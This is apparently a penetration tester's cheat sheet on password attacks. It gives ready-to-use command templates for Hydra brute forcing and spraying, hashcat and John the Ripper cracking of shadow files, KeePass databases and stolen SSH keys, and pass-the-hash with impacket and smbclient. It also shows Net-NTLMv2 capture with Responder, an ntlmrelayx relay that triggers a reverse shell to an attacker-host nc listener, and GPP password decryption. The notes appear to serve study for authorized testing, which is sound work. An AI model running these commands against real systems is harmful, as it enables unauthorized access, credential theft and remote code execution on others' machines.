# Password Attacks

## Online Brute Forcing

### Hydra

```
// Password Guessing
sudo hydra -l <USERNAME> -P <WORDLIST> -s <PORT> <PROTOCOL>://<IP>

// Password Spraying
sudo hydra -L <USERLIST> -p <PASSWORD> -s <PORT> <PROTOCOL>://<IP>
```

`-s` only needed if service is running on non-default port

### Crackmapexec SMB

```
crackmapexec smb <TARGET_IP> -u <USERNAMES_FILE> -p <PASSWORD_FILE> --continue-on-success
```


## Offline Password Cracking

### Hashcat

**Usage**

```
hashcat -m <HASH_MODULE> <HASH_FILE> <WORDLIST> -r <RULE_FILE> --force 
```

Checking rule applications to wordlists (via debugging mode `--stdout`)
```
hashcat -r <RULE_FULE> --stdout <WORDLIST>
```

**Rule orders**, e.g. imagine if wordlist was `password, iloveyou, princess, abc`

If rule file has both rules on same line, they are applied from left-to-right

```
// Append 1 to end of word, capitalise the word
$1 c
```

then the resulting modified words have the rules applied together: `Password1, Iloveyou1, Princess1, Abc1`

If the rule file has each rule on a new line

```
$1
c
```

then the resulting modified words have the rules applied together: `Password, password1, Iloveyou, iloveyou1, Princess, princess1, Abc, abc1`

*Note:* For /etc/passwd and /etc/shadow files, we need to first unshadow using `sudo unshadow <PASSWD> <SHADOW> > hashes.passwd` and then we need to crack in either hashcat or JtR. The protocol used for encryption can be identified in the hash:
- $1: md5crypt
- $2*: bcrypt
- $5: sha256crypt
- $6: sha512crypt
- $7: Scrypt
- $7z: 7-Zip
- $8: Cisco IOS PBKDF2-SHA256
- $9: Cisco IOS scrypt
- $y: yescrypt
- $apr1: Apache
- $sha1: Juniper/NetBSD sha1crypt 
- $argon2i: Argon2

## Password Managers

We can enumerate programs installed on the target to try and find a Password Manager application.

If we can export the password manager database from the target, we can maybe crack the key

```
// Enumerate a Windows machine
PS C:\> Get-ChildItem -Recurse -Include *.jpg -File -ErrorAction SilentlyContinue
```

Copy file to attacker machine.

You can format the database into a hash via tools such as `ssh2john` or `keepass2john` etc. **Note:** these tools output in the format `<USERNAME>:<HASH>` - remove the username if its not used by the target application.

Use these hashes in hashcat, e.g. for KeePass

```
// Uses rockyou-30000 most common rulesets
link@kali:~$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```


## Cracking SSH Private Keys

### Enumerate Key

Get private key by obtaining `id_rsa` somehow (default `~/.ssh/id_rsa`)

Then convert it to hash format

```
link@kali:~$ ssh2john id_rsa > ssh-key.hash
```

Then crack it with chosen wordlist and ruleset

```
link@kali:~$ hashcat -h | grep -i ssh
link@kali:~$ hashcat -m <SSH_MODULE> ./ssh-key.hash <WORDLIST> -r <RULESET> --force
```

Sometimes hashcat may not work for cipher limitations, in this case try John The Ripper

```
john --wordlist=<WORDLIST> --rules=<JTR_RULESET_NAME> ssh-key.hash
```

(Note, to configure rules in JTR, we need to prepend the ruleset file with `[List.Rules::<JTR_RULESET_NAME>]` as the first line, e.g.
```
link@kali:~$ cat john.rule
[List.Rules::sshrule]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

// Append ruleset to configuration; called in in command by <JTR_RULESET_NAME> (e.g. sshrule)
link@kali:~$ sudo sh -c 'cat /full/path/to/john.rule >> /etc/john/john.conf
```
will make the rulset available in the `john` command when cracking with JTR).

And finally...

```
link@kali:~$ ssh -i id_rsa -p <TARGET_PORT> <USER>@<TARGET_IP>
```


## Attacking with NTLM Hashes

### NTLM

If we uncover a NTLM hash, we can try pass-the-hash attacks even if we can't crack the password. Some example tools that support NTLM authentication
- smbclient
- CrackMapExeco
- impacket-library
- PsExec
- wmiexec.py

E.g.

```
link@kali:~$ smbclient \\\\<TARGET_IP>\\<SHARE_NAME> -U <USERNAME> --pw-nt-hash <NTLM_HASH>
```

or 

```
// Gives specified user in command's access
// Note: the 32 rand0 0s are where the LM hash would be, but if only using NTLM then not needed
link@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:<HASH> <USER>@<TARGET_IP> cmd
```

or even 

```
// Gives NT_AUTHORITY\SYSTEM access
// Note: the 32 rand0 0s are where the LM hash would be, but if only using NTLM then not needed
link@kali:~$ impacket-psexec -hashes 00000000000000000000000000000000:<HASH> <USER>@<TARGET_IP> cmd
```

boom

### Net-NTLMv2

If we arne't a local admin rights user, it might be hard to leak SAM or LSASS data etc. to obtain a NTLM hash.

In this case, we can abuse the Net-NTLMv2 authentication protocol to get a Net-NTLMv2 hash.

E.g. we set up a SMB server, force the target to connect to it and capture the hash used during authentication.

```
// Set up SMB server with Responder to reveal Net-NTLMv2 hash
link@kali:~$ responder -I <NETWORK_INTERFACE>
```

then from target:


```
C:\> dir \\<ATTACKER_IP>\<NON_EXISTENT_SHARE>
```

once we have the hash, we can crack it with hashmap using the correct module *or* we can exploit via Net-NTLMv2 relay attack (full command execution requires user to be local admin on target machine).

On attacker machine:

```
link@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c <REVSHELL_PAYLOAD>

link@kali:~$ nc -lvnp <REVSHELL_PORT>
```

On target machine:

```
C:\> dir \\<ATTACKER_IP>\<NON_EXISTENT_SHARE>
```


## AD Group Policy Preferences Passwords

GPP = Group Policy Preferences

GPP allows system administrators to change local workstation passwords in Active Directory. One way of obtaining these passwords is through Policy XML files.

 These are stored with AES-256 encryption but for some reason the encryption key can be found on Microsoft docs: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be

We can therefore easily decrypt these stored passwords using the ruby-based `gpp-decrypt` tool:

```
link@kali:~$ gpp-decrypt "<GPP_PASSWORD>"
```